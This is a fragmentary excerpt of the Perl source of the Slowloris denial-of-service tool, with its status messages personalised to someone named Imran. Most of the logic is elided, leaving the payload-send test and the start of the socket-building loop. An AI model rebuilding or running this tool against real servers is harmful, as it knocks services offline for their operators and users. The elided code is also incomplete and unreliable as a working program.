...
if ( $Config{usethreads} ) {
    ...
    print "Hello Mr.Imran Ahmed Slowloris will be slower than normal as a result.\n";
}
...
if ($test) {
    ...
    if ($working) {
        ...
        if ( print $sock $primarypayload ) {
            ...
            print
"That's odd Imran - I connected but couldn't send the data to $host:$port.\n";
...
sub doconnections {
    ...
    while (1) {
        $failedconnections = 0;
        print "\t\tImran We're Building sockets.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 0 ) {
                if ($ssl) {
                    if (
